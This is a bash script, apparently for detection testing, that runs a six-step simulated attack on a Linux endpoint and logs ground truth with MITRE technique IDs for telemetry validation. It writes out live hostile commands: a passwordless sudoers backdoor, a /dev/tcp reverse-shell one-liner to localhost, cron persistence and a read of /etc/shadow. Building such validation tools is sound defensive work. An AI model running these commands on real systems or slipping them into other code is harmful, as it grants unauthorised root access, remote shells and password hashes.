#!/bin/bash
#This script executes a realistic attack sequence against a hardened Linux endpoint
#and records ground truth data for telemetry validation. The sequence includes:
#
#1. Create user account (testattacker)
#2. Modify sudoers file (privilege escalation)
#3. Execute binary from /tmp (suspicious execution)
#4. Attempt reverse shell to localhost (C2 simulation)
#5. Modify crontab for persistence
#6. Access sensitive files (/etc/shadow)
#
#After execution, all artifacts are cleaned up while preserving the ground truth log.
#
#Output: linux_attack_log.json with action details, timestamps, detection sources, and MITRE techniques
#
set -euo pipefail

OUTPUT_FILE="linux_attack_log.json"

echo "[*] Running Linux attacker simulation..."

TS1=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
echo "    [1/6] Creating user testattacker...                $TS1"
useradd testattacker 2>/dev/null || true

TS2=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
echo "    [2/6] Modifying sudoers...                         $TS2"
echo "testattacker ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/backdoor

TS3=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
echo "    [3/6] Executing from /tmp...                       $TS3"
cp /usr/bin/id /tmp/suspicious_bin
/tmp/suspicious_bin > /dev/null 2>&1 || true

TS4=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
echo "    [4/6] Reverse shell attempt (localhost)...         $TS4"
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &' || true
sleep 1
kill %1 2>/dev/null || true

TS5=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
echo "    [5/6] Cron persistence...                          $TS5"
echo "* * * * * /tmp/beacon.sh" > /etc/cron.d/persistence_test

TS6=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
echo "    [6/6] Accessing /etc/shadow...                     $TS6"
cat /etc/shadow > /dev/null 2>&1 || true

echo "[*] Cleaning up artifacts...                           [CLEAN]"
userdel -r testattacker 2>/dev/null || true
rm -f /etc/sudoers.d/backdoor
rm -f /tmp/suspicious_bin
rm -f /etc/cron.d/persistence_test

# Generate detailed ground truth JSON matching all expected keys, timestamps, telemetry, and MITRE mapping
cat << EOF > "$OUTPUT_FILE"
{
  "simulation": "linux_attacker_sim",
  "actions_executed": 6,
  "status": "completed",
  "cleanup": "success",
  "actions": [
    {
      "step": 1,
      "name": "create_user",
      "timestamp": "$TS1",
      "expected_telemetry": "auth.log / useradd",
      "mitre_technique": "T1136.001"
    },
    {
      "step": 2,
      "name": "modify_sudoers",
      "timestamp": "$TS2",
      "expected_telemetry": "sudoers.d file modification",
      "mitre_technique": "T1548.003"
    },
    {
      "step": 3,
      "name": "execute_from_tmp",
      "timestamp": "$TS3",
      "expected_telemetry": "auditd execve /tmp",
      "mitre_technique": "T1204.002"
    },
    {
      "step": 4,
      "name": "reverse_shell",
      "timestamp": "$TS4",
      "expected_telemetry": "auditd socket connection",
      "mitre_technique": "T1059.004"
    },
    {
      "step": 5,
      "name": "cron_persistence",
      "timestamp": "$TS5",
      "expected_telemetry": "cron directory modification",
      "mitre_technique": "T1053.003"
    },
    {
      "step": 6,
      "name": "access_shadow",
      "timestamp": "$TS6",
      "expected_telemetry": "auditd file access /etc/shadow",
      "mitre_technique": "T1003.008"
    }
  ]
}
EOF

echo "Actions executed: 6"
echo "Ground truth saved to: $OUTPUT_FILE"
